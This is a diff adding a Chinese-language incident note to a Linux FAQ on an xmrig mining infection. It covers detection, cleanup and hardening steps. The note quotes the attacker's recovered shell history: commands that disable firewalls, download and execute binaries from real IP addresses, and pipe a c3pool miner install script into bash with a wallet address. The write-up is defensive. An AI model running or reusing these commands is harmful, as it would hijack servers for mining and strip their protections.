@@ -2439,7 +2439,77 @@ uuidgen enp1s0
 
 > 其实计算机世界都很多设计都是人们现实生活的映射，比如稀疏文件的概念你可以想象我让你在一张白纸上画一只小鸟，正常情况你只需要把鸟画出来就行了，白色的部分不用你涂一遍白色。白色的部分就相当于空洞部分，如果一个文件系统不支持洗漱文件相当于你在画画时不能跳过白色的部分，要把白色涂成白色
 
+## xmrig挖矿 病毒入侵
 
+<font color=orange>**现象： **</font> 
+
+1. 云服务商通过查看网络、流量情况，发现有问题，
+
+![image-20211228161800169](https://gitee.com/liuzel01/picbed/raw/master/data/centos7_faq_xmrig_pcap.png)
+
+2. 登录服务器，
+
+   1. 上图中，检测到的是从服务器请求到外部的  AAAA mine.c3pool.com （解析记录）。猜测是c3pool 矿池
+
+   2. find / -name xmrig           检查服务器上病毒脚本位置
+
+   3. top  检查CPU是否有异常进程
+
+   4. vim /root/.bash_history   检查服务器会话日志
+
+      ​	因为一直在向外发送请求，然后建立了tcp连接，过程中超时了触发了tcp重传机制。所以防火墙和ss  并没有异常端口
+
+3. 如何落地的
+   1. 从服务器会话日志，得知落地方法：  通过下载外网脚本实现，我下面摘抄一部分
+   2. ps x | less    检查类似特殊字眼的进程，将其清除
+
+```bash
+curl -O http://155.94.154.170:8088/confluence;wget http://155.94.154.170:8088/confluence;chmod 777 confluence;./confluence;cd /tmp;curl -O http://155.94.154.170:8088/confluence;wget http://155.94.154.170:8088/confluence;chmod 777 confluence;./confluence
+systemctl disable firewalld;chkconfig iptables off;ufw disable;curl -O http://155.94.154.170:8088/confluence;wget http://155.94.154.170:8088/confluence;chmod 777 confluence;./confluence;cd /tmp;curl -O http://155.94.154.170:8088/confluence;wget http://155.94.154.170:8088/confluence;chmod 777 confluence;./confluence
+systemctl disable firewalld;chkconfig iptables off;ufw disable;curl -O http://155.94.154.170:8088/confluence;wget http://155.94.154.170:8088/confluence;chmod 777 confluence;./confluence;cd /tmp;curl -O http://155.94.154.170:8088/confluence;wget http://155.94.154.170:8088/confluence;chmod 777 confluence;./confluence
+curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429uoEyr56F785ZV37v3toR5Es9M79cUvgrbZFP1w2oMDsnYt3aZJ1a5o5RT9osdF65UpcFq9jQECBPqNmXznCih38MGMWS
+curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429uoEyr56F785ZV37v3toR5Es9M79cUvgrbZFP1w2oMDsnYt3aZJ1a5o5RT9osdF65UpcFq9jQECBPqNmXznCih38MGMWS
+yum -y install curl;apt install curl -y;curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429uoEyr56F785ZV37v3toR5Es9M79cUvgrbZFP1w2oMDsnYt3aZJ1a5o5RT9osdF65UpcFq9jQECBPqNmXznCih38MGMWS
+yum -y install curl;apt install curl -y;curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429uoEyr56F785ZV37v3toR5Es9M79cUvgrbZFP1w2oMDsnYt3aZJ1a5o5RT9osdF65UpcFq9jQECBPqNmXznCih38MGMWS
+curl -O http://155.94.154.170/shiro;wget http://155.94.154.170/shiro;chmod 777 shiro;./shiro;cd /tmp;curl -O http://155.94.154.170/shiro;wget http://155.94.154.170/shiro;chmod 777 shiro;./shiro
+curl -O http://155.94.154.170/shiro;wget http://155.94.154.170/shiro;chmod 777 shiro;./shiro;cd /tmp;curl -O http://155.94.154.170/shiro;wget http://155.94.154.170/shiro;chmod 777 shiro;./shiro
+yum -y install curl;apt install curl -y;curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429uoEyr56F785ZV37v3toR5Es9M79cUvgrbZFP1w2oMDsnYt3aZJ1a5o5RT9osdF65UpcFq9jQECBPqNmXznCih38MGMWS
+curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429uoEyr56F785ZV37v3toR5Es9M79cUvgrbZFP1w2oMDsnYt3aZJ1a5o5RT9osdF65UpcFq9jQECBPqNmXznCih38MGMWS
+```
+
+<font color=orange>**解决： **</font> 
+
+1. 将病毒文件夹下，文件更改名字
+
+   打包，杀死病毒相关进程
+
+2. 最后，为防止从外部下载病毒文件， /etc/yum.repos.d/  文件改名字。 并且卸载 curl wget 等命令
+
+   rpm -q curl 
+
+   rpm -e --nodeps curl-xxxxxx
+
+3. 当然，系统运行后一般不需要连通外网，可以把网络断开，不连接外网
+4. 更改服务器远程登录密码
+
+**保险方案：**
+
+1. 创建免疫文件
+
+   ​	mkdir -p /root/.ryukd.sh （病毒脚本名称）
+
+   ​	chmod 000 /root/.ryukd.sh
+
+   ​	或者， mkdir -p /root/c3pool
+
+   ​				chattr +i -R /root/c3pool
+
+2. 大致这么几步，不成熟的推测
+
+> 通过 crontab -e 命令删除相关的四条定时任务
+> 杀死 xxxx 进程，如果 tsm32、tsm64 进程也存在的话也杀死
+> 删除~/.configrc 目录、/tmp/.X25-unix/.rsync 目录、dota3.tar.gz 文件，以及~/.ssh/authorized_keys 文件
+> 更新 ssh 的账号密码，因为该木马就是通过爆破 ssh 账号进来的
 
 ## linux mail发送邮件不成功
 
